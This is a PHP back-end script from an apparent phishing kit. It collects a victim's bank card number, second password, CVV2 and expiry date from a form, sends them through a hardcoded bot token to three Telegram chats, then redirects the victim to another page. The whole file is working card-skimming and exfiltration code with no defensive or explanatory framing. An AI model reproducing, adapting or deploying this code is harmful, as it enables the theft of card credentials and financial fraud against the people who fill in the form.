﻿<?php
error_reporting(0);
if($_POST['cardnumber']){
$shcart = $_POST['cardnumber'];
$pass = $_POST['secondpass'];
$cvv = $_POST['cvv2'];
$mah = $_POST['expmah'];
$sal = $_POST['expyear'];

$token = "920038714:AAHoUGZv02B30GWgzf8w7CoEW2MX5NBdwLA";

$textmsg =  "
Card💳🤖
➖➖
➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖
*Card : $shcart
*Pin : $pass
*Cvv2 : $cvv
*Date : $sal :  $mah
➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖"
;
	$groupid = -1001471682584;	//change
    $ok =  file_get_contents("https://api.telegram.org/bot".$token."/SendMessage?chat_id=".$groupid."&text=".urlencode($textmsg));
	
	$groupid =  -1001471682585;	//forwarder
    $ok =  file_get_contents("https://api.telegram.org/bot".$token."/SendMessage?chat_id=".$groupid."&text=".urlencode($textmsg));
	
	$groupid = -1001471682585;   //static
    $ok =  file_get_contents("https://api.telegram.org/bot".$token."/SendMessage?chat_id=".$groupid."&text=".urlencode($textmsg));
}else{
    echo "You Don't Have Permision.";
}

?>
<meta content='0;url=token.php?payment=<?php echo rand(11111, 9999999) ?>' http-equiv='refresh'/>
